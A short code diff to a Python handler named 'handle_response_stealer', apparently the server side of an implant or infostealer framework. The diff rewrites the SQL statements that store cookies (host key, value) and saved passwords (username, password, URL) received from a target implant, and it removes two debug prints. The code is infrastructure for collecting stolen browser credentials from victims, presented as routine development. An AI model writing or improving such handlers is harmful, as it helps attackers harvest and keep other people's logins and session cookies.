@@ -231,15 +231,13 @@ def handle_response_stealer():
         tools.executeGenericVar(
             query, [response_data, success, time, task_id])
 
-        query_cookies = "INSERT INTO cookies VALUES (%s, %s, %s, %s, %s)"
+        query_cookies = "INSERT INTO cookies(task_id, target_implant_id, path, hostkey, value) VALUES (%s, %s, %s, %s, %s)"
 
-        query_passwords = "INSERT INTO passwords VALUES(%s, %s, %s, %s, %s, %s)" 
+        query_passwords = "INSERT INTO passwords(task_id, target_implant_id, path, username, password, url) VALUES(%s, %s, %s, %s, %s, %s)" 
 
         response1 = tools.executeMany(query_cookies, cookie_values)
         response2 = tools.executeMany(query_passwords, password_values)
 
-        print("Response1: " + response1)
-        print("Response2: " + response2)
         return "Success", 200, {'Access-Control-Allow-Origin': config.clientURL}
     except Exception as error:
         print(error)
